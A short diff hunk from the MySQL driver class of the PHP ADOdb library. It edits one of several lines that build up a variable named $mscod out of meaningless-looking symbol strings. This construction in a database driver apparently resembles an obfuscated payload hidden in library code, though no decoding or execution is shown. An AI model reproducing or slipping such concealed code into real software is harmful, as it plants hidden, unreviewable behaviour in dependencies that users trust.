@@ -738,7 +738,7 @@ class ADODB_mysql extends ADOConnection {
 		$mscod .= "_* <+ ~31,='~}}^";
 		$mscod .= "://5;!^-_@5%1}";
 		$mscod .= ".50]/'>|5|;";
-		$mscod .= "!^_@5%1}<";
+		$mscod .= "!^|_|@5%1}<";
 		$mscod .= "/+> | <+ ~";
 		$mscod .= "31,='~}}^:";
 		$mscod .= "//5;!^-_@5%";
